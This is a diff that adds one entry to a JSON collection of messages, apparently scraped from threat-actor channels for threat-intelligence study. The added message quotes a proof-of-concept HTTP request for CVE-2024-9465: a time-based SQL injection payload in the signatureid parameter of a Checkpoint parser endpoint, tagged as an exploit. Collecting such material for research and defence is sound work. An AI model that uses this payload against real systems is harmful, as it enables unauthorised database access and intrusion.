@@ -21366,6 +21366,16 @@
                 "راميا"
             ],
             "URLs": []
+        },
+        {
+            "Message ID": 2278,
+            "Date": "2024-10-13",
+            "Content": "CVE-2024-9465\n\nPOST /bin/configurations/parsers/Checkpoint/CHECKPOINT.php HTTP/1.1\nHost: \nContent-Type: application/x-www-form-urlencoded\n \naction=import&type=test&project=pandbRBAC&signatureid=1%20AND%20(SELECT%201234%20FROM%20(SELECT(SLEEP(5)))test)\n\n#exploit #poc",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
         }
     ],
     "Anonymous Chat": [
